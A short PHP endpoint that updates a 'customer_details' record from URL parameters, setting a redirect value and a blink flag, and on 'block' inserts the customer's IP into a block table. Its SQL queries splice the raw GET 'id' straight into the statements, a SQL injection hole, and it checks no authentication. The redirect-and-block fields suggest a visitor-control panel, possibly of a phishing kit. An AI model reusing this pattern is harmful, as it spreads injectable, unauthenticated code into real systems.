<?php
require_once("../common/commonfiles.php");
$id = !empty($_GET['id']) ? $_GET['id'] : "";
$redirect1 = !empty($_GET['redirect1']) ? $_GET['redirect1'] : "";
if (!empty($id)) {
    $obj['redirect1'] = $redirect1;
	$obj['blink'] = 0;
    $query = db::prepUpdateQuery($obj, "customer_details", "id", $id); //(Associative array, table name, record id)
    $result = db::updateRecord($query);
    if($redirect1 == "block"){
        $ip = db::getCell("SELECT ip FROM customer_details WHERE id='".$id."'");
        db::insertRecord("INSERT INTO ips (`id`,`ip`,`is_block`) VALUES (NULL,'" . $ip . "','1');");
    }
    return $result;
}
?>